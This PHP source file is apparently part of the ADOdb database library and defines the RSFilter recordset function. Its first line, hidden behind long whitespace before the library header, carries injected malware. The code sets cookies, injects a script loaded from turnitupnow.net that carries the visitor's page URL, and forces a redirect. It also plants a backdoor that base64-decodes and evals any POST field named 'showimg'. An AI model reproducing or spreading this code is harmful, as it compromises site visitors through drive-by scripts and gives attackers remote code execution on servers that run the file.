<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

/** 
 * @version V4.93 10 Oct 2006 (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
 * Released under both BSD license and Lesser GPL library license. 
 * Whenever there is any discrepancy between the two licenses, 
 * the BSD license will take precedence. 
 *
 * Set tabs to 4 for best viewing.
 * 
 * Latest version is available at http://php.weblogs.com
 *
 * Requires PHP4.01pl2 or later because it uses include_once
*/

/*
	Filter all fields and all rows in a recordset and returns the 
	processed recordset. We scroll to the beginning of the new recordset
	after processing.
	
	We pass a recordset and function name to RSFilter($rs,'rowfunc');
	and the function will be called multiple times, once
	for each row in the recordset. The function will be passed
	an array containing one row repeatedly.
	
	Example: 
 	
	// ucwords() every element in the recordset
	function do_ucwords(&$arr,$rs)
	{
		foreach($arr as $k => $v) {
			$arr[$k] = ucwords($v);
		}
	}
	$rs = RSFilter($rs,'do_ucwords');
 */
function &RSFilter($rs,$fn)
{
	if ($rs->databaseType != 'array') {
		if (!$rs->connection) return false;
		
		$rs = &$rs->connection->_rs2rs($rs);
	}
	$rows = $rs->RecordCount();
	for ($i=0; $i < $rows; $i++) {
		if (is_array ($fn)) {
        	$obj = $fn[0];
        	$method = $fn[1];
        	$obj->$method ($rs->_array[$i],$rs);
      } else {
			$fn($rs->_array[$i],$rs);
      }
	  
	}
	if (!$rs->EOF) {
		$rs->_currentRow = 0;
		$rs->fields = $rs->_array[0];
	}
	
	return $rs;
}
?>